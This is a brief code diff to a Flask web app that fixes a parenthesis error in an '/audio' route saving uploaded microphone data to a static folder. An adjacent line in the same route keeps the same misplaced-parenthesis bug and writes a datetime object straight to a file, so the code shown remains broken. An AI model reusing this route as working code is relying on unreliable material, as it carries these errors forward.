@@ -518,7 +518,7 @@ def cmd():
 @app.route("/audio",methods=["GET","POST"])
 def audio():
 	if request.method == "POST":
-		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav","wb")) as file:
+		with open(os.path.join(STATIC_FOLDER,"mic","audio.wav"),"wb") as file:
 			file.write(request.data)
 		with open(os.path.join(STATIC_FOLDER,"mic","time.txt","w")) as file:
 			file.write(datetime.now())
